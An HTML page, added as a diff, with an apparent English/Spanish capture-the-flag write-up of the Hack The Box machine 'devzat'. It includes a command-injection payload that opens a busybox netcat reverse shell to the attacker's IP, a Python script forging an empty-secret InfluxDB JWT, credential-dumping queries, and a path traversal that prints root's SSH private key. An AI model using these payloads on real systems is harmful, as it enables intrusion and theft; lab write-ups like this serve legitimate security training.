@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>devzat | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">devzat</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ===================== ENGLISH ===================== -->
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The attack begins with enumeration of the target, which reveals a static web page on port 80 and
+                        an unusual SSH-based chat service running on port 8000. A virtual host fuzzing pass uncovers a
+                        subdomain — <code>pets.devzat.htb</code> — running a Go web application. An exposed
+                        <code>.git</code> directory lets us download the source code, where we discover that the
+                        <code>species</code> field is passed unsanitized to a shell command, giving us a trivial
+                        command injection RCE. This yields a reverse shell as <code>patrick</code>.</p>
+
+                    <p>From inside the machine we find several locally-bound ports. Port 8086 turns out to be InfluxDB
+                        version 1.7.5, which is vulnerable to <a
+                            href="https://nvd.nist.gov/vuln/detail/cve-2019-20933">CVE-2019-20933</a> — an
+                        authentication bypass that accepts a JWT signed with an empty secret. Generating such a token
+                        and querying the database exposes credentials for the user <code>catherine</code>, granting us
+                        SSH access and the user flag.</p>
+
+                    <p>The path to root comes from a pair of zip backups found in <code>/var/backups</code>. Diffing
+                        the two versions of the chat application source code reveals a <code>/file</code> command in the
+                        development version, protected by a hardcoded password and running on port 8443. The command
+                        constructs file paths relative to a working directory, but a path traversal allows us to escape
+                        it and read <code>/root/.ssh/id_rsa</code> directly through the chat interface, yielding root
+                        access.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> Command injection RCE via unsanitized shell exec in a Go
+                        web app, InfluxDB authentication bypass via JWT empty secret (CVE-2019-20933), path traversal in
+                        a custom chat file-read command.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>      <span style="color:#e06c75;">STATE</span>  <span style="color:#e06c75;">SERVICE</span>   <span style="color:#e06c75;">VERSION</span>
+<span style="color:#61afef;">22/tcp</span>    open   ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+<span style="color:#61afef;">80/tcp</span>    open   http      Apache httpd 2.4.41
+<span style="color:#c678dd;">|_http-title:</span> Did not follow redirect to http://devzat.htb/
+<span style="color:#c678dd;">|_http-server-header:</span> Apache/2.4.41 (Ubuntu)
+<span style="color:#61afef;">8000/tcp</span>  open   ssh       Golang x/crypto/ssh server (protocol 2.0)
+<span style="color:#98c379;">Service Info:</span> Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre>
+
+                <p>Three ports stand out: SSH on 22, Apache on 80, and something unusual on port 8000 — also
+                    identified as SSH, but served by a Golang application. The HTTP server redirects to
+                    <code>devzat.htb</code>, so we add it to <code>/etc/hosts</code>.</p>
+
+                <h2>Web Enumeration — Port 80 and the Chat Service</h2>
+                <p>Port 80 serves a static website about a developer chat application. The page includes the contact
+                    address <code>patrick@devzat.htb</code> and invites visitors to connect to the chat via SSH:</p>
+
+                <p><img src="./media/image2.png"
+                        alt="Static website for devzat showing connection instructions for the SSH-based chat on port 8000" /></p>
+
+                <p>Trying to connect as suggested fails immediately due to a legacy key algorithm issue — this machine
+                    is from 2021, when <code>ssh-rsa</code> was still common, but modern OpenSSH disables it by
+                    default. We can work around it:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ssh</span> <span style="color:#e06c75;">-l</span> xd devzat.htb <span style="color:#e06c75;">-p</span> 8000 <span style="color:#e06c75;">-o</span> HostKeyAlgorithms=ssh-rsa <span style="color:#e06c75;">-o</span> PubkeyAcceptedAlgorithms=ssh-rsa</code></pre>
+
+                <p>This connects us to the chat. Running <code>/help</code> reveals it's the open-source
+                    <a href="https://github.com/quackduck/devzat">devzat</a> project. We note this for later and
+                    continue enumeration.</p>
+
+                <h2>Virtual Host Discovery — pets.devzat.htb</h2>
+                <p>Fuzzing for virtual hosts uncovers a second subdomain:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">pets.devzat.htb</span>  Status: 200  [Size: 510]</code></pre>
+
+                <p>Adding it to <code>/etc/hosts</code> and inspecting it with <code>whatweb</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">whatweb</span> http://pets.devzat.htb</code></pre>
+
+                <pre><code class="language-plaintext">http://pets.devzat.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5,
+HTTPServer[<span style="color:#e5c07b;">My genious go pet server</span>], IP[10.129.136.15], Script[module], Title[Pet Inventory]</code></pre>
+
+                <p>The <code>HTTPServer</code> header gives it away: this is a custom Go application. The UI allows
+                    adding pets to an inventory.</p>
+
+                <h2>Source Code Analysis — Command Injection via .git Exposure</h2>
+                <p>Directory fuzzing against <code>pets.devzat.htb</code> reveals an exposed git repository:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">.git</span>  (Status: 301)  [Size: 41]  [--> /.git/]</code></pre>
+
+                <p>Using <code>git-dumper</code> we download the full repository and inspect the source. The
+                    vulnerable path is immediately obvious in the pet-adding logic:</p>
+
+                <pre><code class="language-go"><span style="color:#c678dd;">func</span> <span style="color:#61afef;">addPet</span>(w http.ResponseWriter, r *http.Request) {
+    <span style="color:#7f848e;">// ...</span>
+    addPet.Characteristics = <span style="color:#61afef;">loadCharacter</span>(addPet.Species)
+}
+
+<span style="color:#c678dd;">func</span> <span style="color:#61afef;">loadCharacter</span>(species <span style="color:#e5c07b;">string</span>) <span style="color:#e5c07b;">string</span> {
+    cmd := exec.<span style="color:#61afef;">Command</span>(<span style="color:#98c379;">"sh"</span>, <span style="color:#98c379;">"-c"</span>, <span style="color:#98c379;">"cat characteristics/"</span>+species)
+    <span style="color:#7f848e;">// ...</span>
+}</code></pre>
+
+                <p>The <code>species</code> field is concatenated directly into a shell command with no sanitization
+                    whatsoever. Although the web UI doesn't expose this field as a visible input, the underlying API
+                    accepts it in the POST request body, so we can inject whatever we like.</p>
+
+                <h2>Initial Access — Command Injection RCE</h2>
+                <p>We first confirm RCE with a simple out-of-band probe — a curl request back to our machine:</p>
+
+                <p><img src="./media/image1.png"
+                        alt="curl command sending a POST request to pets.devzat.htb/api/pet with a command injection payload in the species field, triggering an HTTP callback to the attacker's server" /></p>
+
+                <p>The request hits our Python HTTP server, confirming code execution. Now we send a reverse shell
+                    payload:</p>
+
+                <pre><code class="language-json">{<span style="color:#e06c75;">"name"</span>:<span style="color:#98c379;">"qwe"</span>,<span style="color:#e06c75;">"species"</span>:<span style="color:#98c379;">"$(busybox nc 10.10.14.142 443 -e bash)"</span>}</code></pre>
+
+                <p>With a listener ready on port 443, we catch the shell and land as user <code>patrick</code>.</p>
+
+                <h2>Internal Enumeration as patrick</h2>
+                <p>Poking around the filesystem we notice a second user — <code>catherine</code> — and find her home
+                    directory is present. More interestingly, checking locally bound ports reveals three services not
+                    exposed externally:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ss</span> <span style="color:#e06c75;">-tlnp</span></code></pre>
+
+                <p>Ports <code>5000</code>, <code>8086</code>, and <code>8443</code> are all listening on localhost
+                    only. Port 5000 is the <code>pets</code> application we already know. Port 8443 is another unknown
+                    SSH-like service. Port 8086 returns a <em>"page not found"</em> response — typical of a REST API.
+                    The process list confirms it runs inside a Docker container as root:</p>
+
+                <pre><code class="language-plaintext">root  1242  ...  /usr/bin/docker-proxy -proto tcp -host-ip <span style="color:#e5c07b;">127.0.0.1</span>
+    -host-port <span style="color:#98c379;">8086</span> -container-ip 172.17.0.2 -container-port 8086</code></pre>
+
+                <p>We also spot two zip archives in <code>/var/backups</code> owned by <code>catherine</code>, which we
+                    can't read yet:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">-rw-------</span> 1 catherine catherine 28K Jul 16  2021 devzat-dev.zip
+<span style="color:#e06c75;">-rw-------</span> 1 catherine catherine 27K Jul 16  2021 devzat-main.zip</code></pre>
+
+                <p>We tunnel through to the internal ports using <code>chisel</code>, starting with port 8086.</p>
+
+                <h2>InfluxDB Authentication Bypass — CVE-2019-20933</h2>
+                <p>Fuzzing the API on port 8086 surfaces several endpoints:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">status</span>   (Status: 204)  [Size: 0]
+<span style="color:#e06c75;">query</span>    (Status: 401)  [Size: 55]
+<span style="color:#98c379;">ping</span>     (Status: 204)  [Size: 0]
+<span style="color:#98c379;">metrics</span>  (Status: 200)  [Size: 5534]
+<span style="color:#e06c75;">write</span>    (Status: 405)  [Size: 19]</code></pre>
+
+                <p>The <code>/metrics</code> endpoint exposes Go runtime metrics. Combined with the REST-style API
+                    design, this is unmistakably <strong>InfluxDB</strong>. We confirm the exact version:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> http://localhost:8086/ping <span style="color:#e06c75;">-v</span></code></pre>
+
+                <pre><code class="language-plaintext">&lt; X-Influxdb-Build: <span style="color:#98c379;">OSS</span>
+&lt; X-Influxdb-Version: <span style="color:#e5c07b;">1.7.5</span></code></pre>
+
+                <p>Version 1.7.5 is vulnerable to <a
+                        href="https://nvd.nist.gov/vuln/detail/cve-2019-20933">CVE-2019-20933</a>. The NVD description
+                    reads:</p>
+
+                <blockquote>
+                    <p>"InfluxDB before 1.7.6 has an authentication bypass vulnerability in the
+                        <code>authenticate</code> function in <code>services/httpd/handler.go</code> because a JWT
+                        token may have an empty SharedSecret (aka shared secret)."</p>
+                </blockquote>
+
+                <p>In other words, if the server has no shared secret configured (the default), any JWT signed with an
+                    empty string will be accepted as valid. We generate one with a short Python script:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">import</span> jwt  <span style="color:#7f848e;"># pip install pyjwt</span>
+<span style="color:#c678dd;">import</span> time
+
+token = jwt.<span style="color:#61afef;">encode</span>(
+    {<span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"admin"</span>, <span style="color:#98c379;">"exp"</span>: time.<span style="color:#61afef;">time</span>() + <span style="color:#e5c07b;">3600</span>},
+    <span style="color:#98c379;">""</span>,  <span style="color:#7f848e;"># empty secret</span>
+    algorithm=<span style="color:#98c379;">"HS256"</span>
+)
+<span style="color:#61afef;">print</span>(token)</code></pre>
+
+                <h3>Enumerating the Database</h3>
+                <p>With the forged token in hand, we query InfluxDB step by step. First, listing available
+                    databases:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#e06c75;">-G</span> <span style="color:#98c379;">'http://localhost:8086/query'</span> \
+  <span style="color:#e06c75;">-H</span> <span style="color:#98c379;">"Authorization: Bearer &lt;token&gt;"</span> \
+  <span style="color:#e06c75;">--data-urlencode</span> <span style="color:#98c379;">"q=SHOW DATABASES"</span> | jq</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"results"</span>: [{
+    <span style="color:#e06c75;">"series"</span>: [{
+      <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"databases"</span>,
+      <span style="color:#e06c75;">"values"</span>: [[<span style="color:#98c379;">"devzat"</span>], [<span style="color:#98c379;">"_internal"</span>]]
+    }]
+  }]
+}</code></pre>
+
+                <p>Then listing measurements (tables) inside <code>devzat</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#e06c75;">-G</span> <span style="color:#98c379;">'http://localhost:8086/query'</span> \
+  <span style="color:#e06c75;">-H</span> <span style="color:#98c379;">"Authorization: Bearer &lt;token&gt;"</span> \
+  <span style="color:#e06c75;">--data-urlencode</span> <span style="color:#98c379;">"q=SHOW MEASUREMENTS ON devzat"</span> | jq</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"results"</span>: [{
+    <span style="color:#e06c75;">"series"</span>: [{
+      <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"measurements"</span>,
+      <span style="color:#e06c75;">"values"</span>: [[<span style="color:#98c379;">"user"</span>]]
+    }]
+  }]
+}</code></pre>
+
+                <p>And finally dumping all records from the <code>user</code> measurement:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#e06c75;">-G</span> <span style="color:#98c379;">'http://localhost:8086/query'</span> \
+  <span style="color:#e06c75;">-H</span> <span style="color:#98c379;">"Authorization: Bearer &lt;token&gt;"</span> \
+  <span style="color:#e06c75;">--data-urlencode</span> <span style="color:#98c379;">"db=devzat"</span> \
+  <span style="color:#e06c75;">--data-urlencode</span> <span style="color:#98c379;">"q=SELECT * FROM \"user\""</span> | jq</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#e06c75;">"results"</span>: [{
+    <span style="color:#e06c75;">"series"</span>: [{
+      <span style="color:#e06c75;">"name"</span>: <span style="color:#98c379;">"user"</span>,
+      <span style="color:#e06c75;">"columns"</span>: [<span style="color:#98c379;">"time"</span>, <span style="color:#98c379;">"enabled"</span>, <span style="color:#98c379;">"password"</span>, <span style="color:#98c379;">"username"</span>],
+      <span style="color:#e06c75;">"values"</span>: [
+        [<span style="color:#98c379;">"..."</span>, <span style="color:#e5c07b;">false</span>, <span style="color:#98c379;">"WillyWonka2021"</span>,                 <span style="color:#98c379;">"wilhelm"</span>],
+        [<span style="color:#98c379;">"..."</span>, <span style="color:#e5c07b;">true</span>,  <span style="color:#98c379;">"woBeeYareedahc7Oogeephies7Aiseci"</span>, <span style="color:#98c379;">"catherine"</span>],
+        [<span style="color:#98c379;">"..."</span>, <span style="color:#e5c07b;">true</span>,  <span style="color:#98c379;">"RoyalQueenBee$"</span>,                  <span style="color:#98c379;">"charles"</span>]
+      ]
+    }]
+  }]
+}</code></pre>
+
+                <p>The credentials <code>catherine:woBeeYareedahc7Oogeephies7Aiseci</code> are valid for SSH. We log
+                    in as <code>catherine</code> and grab the user flag.</p>
+
+                <h2>Privilege Escalation — Path Traversal in the Dev Chat Service</h2>
+                <p>Now with access as <code>catherine</code> we can finally read those backup archives. Unzipping both
+                    and running a diff on the most interesting file:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">diff</span> main/commands.go dev/commands.go</code></pre>
+
+                <p>The diff reveals that the development version adds a new <code>file</code> command to the chat
+                    application:</p>
+
+                <pre><code class="language-go"><span style="color:#7f848e;">// Added import in dev version:</span>
+<span style="color:#98c379;">"bufio"</span>
+<span style="color:#98c379;">"os"</span>
+<span style="color:#98c379;">"path/filepath"</span>
+
+<span style="color:#7f848e;">// New command registration:</span>
+file = commandInfo{<span style="color:#98c379;">"file"</span>, <span style="color:#98c379;">"Paste a files content directly to chat [alpha]"</span>, fileCommand, <span style="color:#e5c07b;">1</span>, <span style="color:#e5c07b;">false</span>, <span style="color:#e5c07b;">nil</span>}
+
+<span style="color:#7f848e;">// New command handler:</span>
+<span style="color:#c678dd;">func</span> <span style="color:#61afef;">fileCommand</span>(u *user, args []<span style="color:#e5c07b;">string</span>) {
+    <span style="color:#c678dd;">if</span> <span style="color:#61afef;">len</span>(args) &lt; <span style="color:#e5c07b;">2</span> {
+        u.<span style="color:#61afef;">system</span>(<span style="color:#98c379;">"You need to provide the correct password to use this function"</span>)
+        <span style="color:#c678dd;">return</span>
+    }
+
+    path := args[<span style="color:#e5c07b;">0</span>]
+    pass := args[<span style="color:#e5c07b;">1</span>]
+
+    <span style="color:#7f848e;">// Check my secure password</span>
+    <span style="color:#c678dd;">if</span> pass != <span style="color:#98c379;">"CeilingCatStillAThingIn2021?"</span> {
+        u.<span style="color:#61afef;">system</span>(<span style="color:#98c379;">"You did provide the wrong password"</span>)
+        <span style="color:#c678dd;">return</span>
+    }
+
+    <span style="color:#7f848e;">// Get CWD</span>
+    cwd, err := os.<span style="color:#61afef;">Getwd</span>()
+
+    <span style="color:#7f848e;">// Construct path to print</span>
+    printPath := filepath.<span style="color:#61afef;">Join</span>(cwd, path)
+
+    <span style="color:#7f848e;">// Check if file exists</span>
+    <span style="color:#c678dd;">if</span> _, err := os.<span style="color:#61afef;">Stat</span>(printPath); err == <span style="color:#e5c07b;">nil</span> {
+        file, err := os.<span style="color:#61afef;">Open</span>(printPath)
+        <span style="color:#7f848e;">// ... read and print line by line</span>
+    }
+}</code></pre>
+
+                <p>Key observations: the <code>file</code> command requires a hardcoded password
+                    (<code>CeilingCatStillAThingIn2021?</code>), constructs the file path by joining the
+                    <em>current working directory</em> with the user-supplied path using <code>filepath.Join</code>, and
+                    prints the file contents line by line back to the chat. The command is only present in the
+                    <strong>development</strong> version — so we need to find where that version is running. Port 8443
+                    is the unknown one.</p>
+
+                <h3>Connecting to the Dev Chat on Port 8443</h3>
+                <pre><code class="language-bash">catherine@devzat:~$ <span style="color:#61afef;">ssh</span> <span style="color:#e06c75;">-l</span> xd devzat.htb <span style="color:#e06c75;">-p</span> 8443</code></pre>
+
+                <pre><code class="language-plaintext">devbot: xd has joined the chat
+
+xd: /commands
+[SYSTEM] Commands
+[SYSTEM] clear - Clears your terminal
+[SYSTEM] ...
+[SYSTEM] <span style="color:#98c379;">file - Paste a files content directly to chat [alpha]</span></code></pre>
+
+                <p>The <code>file</code> command is present. We try the obvious path first:</p>
+
+                <pre><code class="language-plaintext">xd: /file /root/.ssh/id_rsa CeilingCatStillAThingIn2021?
+[SYSTEM] The requested file @ <span style="color:#e06c75;">/root/devzat/root/.ssh/id_rsa</span> does not exist!</code></pre>
+
+                <p>The error message exposes the working directory: <code>/root/devzat</code>. The application is
+                    prepending this to our supplied path, so an absolute path becomes
+                    <code>/root/devzat/root/.ssh/id_rsa</code>. However, <code>filepath.Join</code> doesn't sanitize
+                    <code>../</code> traversal sequences, so we can escape the CWD:</p>
+
+                <pre><code class="language-plaintext">xd: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
+[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
+[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
+[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
+[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
+[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
+[SYSTEM] -----END OPENSSH PRIVATE KEY-----</code></pre>
+
+                <p>Root's private SSH key, served directly through the chat. We copy it to our machine, set
+                    permissions, and connect:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">chmod</span> 600 id_rsa
+<span style="color:#61afef;">ssh</span> <span style="color:#e06c75;">-i</span> id_rsa root@devzat.htb</code></pre>
+
+                <p>Root access achieved. Machine complete.</p>
+            </div>
+
+            <!-- ===================== ESPAÑOL ===================== -->
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>El ataque comienza con la enumeración del objetivo, que revela una web estática en el puerto 80
+                        y un inusual servicio de chat basado en SSH corriendo en el puerto 8000. Un fuzzing de virtual
+                        hosts descubre un subdominio — <code>pets.devzat.htb</code> — que ejecuta una aplicación web
+                        en Go. Un directorio <code>.git</code> expuesto nos permite descargar el código fuente, donde
+                        encontramos que el campo <code>species</code> se concatena directamente en un comando de shell
+                        sin ningún tipo de saneamiento, lo que nos da una inyección de comandos trivial. Esto nos
+                        proporciona una reverse shell como <code>patrick</code>.</p>
+
+                    <p>Desde dentro de la máquina encontramos varios puertos con escucha local. El puerto 8086 resulta
+                        ser InfluxDB versión 1.7.5, vulnerable a <a
+                            href="https://nvd.nist.gov/vuln/detail/cve-2019-20933">CVE-2019-20933</a>, un bypass de
+                        autenticación que acepta un JWT firmado con un secreto vacío. Generando dicho token y
+                        consultando la base de datos obtenemos credenciales para el usuario <code>catherine</code>,
+                        consiguiendo acceso SSH y la flag de usuario.</p>
+
+                    <p>El camino hacia root viene de un par de zips de backup en <code>/var/backups</code>. Al hacer
+                        diff entre ambas versiones del código fuente de la aplicación de chat, aparece un comando
+                        <code>/file</code> en la versión de desarrollo, protegido por una contraseña hardcodeada y
+                        corriendo en el puerto 8443. El comando construye rutas de fichero relativas a un directorio
+                        de trabajo, pero un path traversal nos permite escapar de él y leer
+                        <code>/root/.ssh/id_rsa</code> directamente desde el chat, obteniendo acceso root.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> RCE mediante inyección de comandos en un exec de shell
+                        sin sanitizar en una app Go, bypass de autenticación en InfluxDB mediante JWT con secreto vacío
+                        (CVE-2019-20933), path traversal en un comando de lectura de ficheros de un chat a medida.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>      <span style="color:#e06c75;">ESTADO</span>  <span style="color:#e06c75;">SERVICIO</span>   <span style="color:#e06c75;">VERSIÓN</span>
+<span style="color:#61afef;">22/tcp</span>    open    ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+<span style="color:#61afef;">80/tcp</span>    open    http       Apache httpd 2.4.41
+<span style="color:#c678dd;">|_http-title:</span> Did not follow redirect to http://devzat.htb/
+<span style="color:#c678dd;">|_http-server-header:</span> Apache/2.4.41 (Ubuntu)
+<span style="color:#61afef;">8000/tcp</span>  open    ssh        Golang x/crypto/ssh server (protocol 2.0)
+<span style="color:#98c379;">Service Info:</span> Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre>
+
+                <p>Tres puertos destacan: SSH en el 22, Apache en el 80, y algo inusual en el puerto 8000 — también
+                    identificado como SSH, pero servido por una aplicación Go. El servidor HTTP redirige a
+                    <code>devzat.htb</code>, así que lo añado al <code>/etc/hosts</code>.</p>
+
+                <h2>Enumeración Web — Puerto 80 y el Servicio de Chat</h2>
+                <p>El puerto 80 sirve una web estática sobre una aplicación de chat para desarrolladores. La página
+                    incluye el correo <code>patrick@devzat.htb</code> e invita a los visitantes a conectarse al chat
+                    mediante SSH:</p>
+
+                <p><img src="./media/image2.png"
+                        alt="Web estática de devzat mostrando las instrucciones de conexión al chat SSH en el puerto 8000" /></p>
+
+                <p>Intentar conectarse como se indica falla de inmediato por un problema con el algoritmo de clave
+                    — esta máquina es de 2021, cuando <code>ssh-rsa</code> aún era habitual, pero las versiones
+                    modernas de OpenSSH lo deshabilitan por defecto. Podemos solucionarlo con:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ssh</span> <span style="color:#e06c75;">-l</span> xd devzat.htb <span style="color:#e06c75;">-p</span> 8000 <span style="color:#e06c75;">-o</span> HostKeyAlgorithms=ssh-rsa <span style="color:#e06c75;">-o</span> PubkeyAcceptedAlgorithms=ssh-rsa</code></pre>
+
+                <p>Esto nos conecta al chat. Con <code>/help</code> confirmamos que es el proyecto open source
+                    <a href="https://github.com/quackduck/devzat">devzat</a>. Lo anotamos para más adelante y
+                    continuamos con la enumeración.</p>
+
+                <h2>Descubrimiento de Virtual Hosts — pets.devzat.htb</h2>
+                <p>El fuzzing de virtual hosts descubre un segundo subdominio:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">pets.devzat.htb</span>  Status: 200  [Size: 510]</code></pre>
+
+                <p>Lo añado al <code>/etc/hosts</code> y lo inspecciono con <code>whatweb</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">whatweb</span> http://pets.devzat.htb</code></pre>
+
+                <pre><code class="language-plaintext">http://pets.devzat.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5,
+HTTPServer[<span style="color:#e5c07b;">My genious go pet server</span>], IP[10.129.136.15], Script[module], Title[Pet Inventory]</code></pre>
+
+                <p>La cabecera <code>HTTPServer</code> lo delata: es una aplicación Go a medida. La interfaz permite
+                    añadir mascotas a un inventario.</p>
+
+                <h2>Análisis del Código Fuente — Inyección de Comandos por Exposición del .git</h2>
+                <p>El fuzzing de directorios contra <code>pets.devzat.htb</code> revela un repositorio git
+                    expuesto:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">.git</span>  (Status: 301)  [Size: 41]  [--> /.git/]</code></pre>
+
+                <p>Usando <code>git-dumper</code> descargo el repositorio completo y analizo el código. La ruta
+                    vulnerable es inmediatamente obvia en la lógica de añadir mascotas:</p>
+
+                <pre><code class="language-go"><span style="color:#c678dd;">func</span> <span style="color:#61afef;">addPet</span>(w http.ResponseWriter, r *http.Request) {
+    <span style="color:#7f848e;">// ...</span>
+    addPet.Characteristics = <span style="color:#61afef;">loadCharacter</span>(addPet.Species)
+}
+
+<span style="color:#c678dd;">func</span> <span style="color:#61afef;">loadCharacter</span>(species <span style="color:#e5c07b;">string</span>) <span style="color:#e5c07b;">string</span> {
+    cmd := exec.<span style="color:#61afef;">Command</span>(<span style="color:#98c379;">"sh"</span>, <span style="color:#98c379;">"-c"</span>, <span style="color:#98c379;">"cat characteristics/"</span>+species)
+    <span style="color:#7f848e;">// ...</span>
+}</code></pre>
+
+                <p>El campo <code>species</code> se concatena directamente en un comando de shell sin ningún tipo de
+                    saneamiento. Aunque la interfaz web no expone este campo como un input visible, la API subyacente
+                    lo acepta en el cuerpo del request POST, así que podemos inyectar lo que queramos.</p>
+
+                <h2>Acceso Inicial — RCE mediante Inyección de Comandos</h2>
+                <p>Primero confirmo la ejecución de código con una sonda out-of-band — una petición curl de vuelta
+                    a nuestra máquina:</p>
+
+                <p><img src="./media/image1.png"
+                        alt="Comando curl enviando un POST a pets.devzat.htb/api/pet con un payload de inyección de comandos en el campo species, que provoca una callback HTTP al servidor del atacante" /></p>
+
+                <p>La petición llega a nuestro servidor HTTP de Python, confirmando la ejecución de código. Ahora
+                    enviamos el payload de reverse shell:</p>
+
+                <pre><code class="language-json">{<span style="color:#e06c75;">"name"</span>:<span style="color:#98c379;">"qwe"</span>,<span style="color:#e06c75;">"species"</span>:<span style="color:#98c379;">"$(busybox nc 10.10.14.142 443 -e bash)"</span>}</code></pre>
+
+                <p>Con un listener activo en el puerto 443, recibimos la shell y aterrizamos como el usuario
+                    <code>patrick</code>.</p>
+
+                <h2>Enumeración Interna como patrick</h2>
+                <p>Revisando el sistema de ficheros encontramos un segundo usuario — <code>catherine</code> — y su
+                    directorio home. Más interesante aún, comprobando los puertos con escucha local encontramos tres
+                    servicios no expuestos al exterior:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ss</span> <span style="color:#e06c75;">-tlnp</span></code></pre>
+
+                <p>Los puertos <code>5000</code>, <code>8086</code> y <code>8443</code> están todos escuchando
+                    únicamente en localhost. El 5000 es la aplicación <code>pets</code> que ya conocemos. El 8443
+                    es otro servicio SSH desconocido. El 8086 devuelve un <em>"page not found"</em> — típico de una
+                    API REST. La lista de procesos confirma que corre dentro de un contenedor Docker como root:</p>
+
+                <pre><code class="language-plaintext">root  1242  ...  /usr/bin/docker-proxy -proto tcp -host-ip <span style="color:#e5c07b;">127.0.0.1</span>
+    -host-port <span style="color:#98c379;">8086</span> -container-ip 172.17.0.2 -container-port 8086</code></pre>
+
+                <p>También encontramos dos archivos zip en <code>/var/backups</code> propiedad de
+                    <code>catherine</code>, que de momento no podemos leer:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">-rw-------</span> 1 catherine catherine 28K Jul 16  2021 devzat-dev.zip
+<span style="color:#e06c75;">-rw-------</span> 1 catherine catherine 27K Jul 16  2021 devzat-main.zip</code></pre>
+
+                <p>Tunelizo hacia los puertos internos usando <code>chisel</code>, empezando por el 8086.</p>
+
+                <h2>Bypass de Autenticación en InfluxDB — CVE-2019-20933</h2>
+                <p>El fuzzing de la API en el puerto 8086 muestra varios endpoints:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">status</span>   (Status: 204)  [Size: 0]
+<span style="color:#e06c75;">query</span>    (Status: 401)  [Size: 55]
+<span style="color:#98c379;">ping</span>     (Status: 204)  [Size: 0]
+<span style="color:#98c379;">metrics</span>  (Status: 200)  [Size: 5534]
+<span style="color:#e06c75;">write</span>    (Status: 405)  [Size: 19]</code></pre>
+
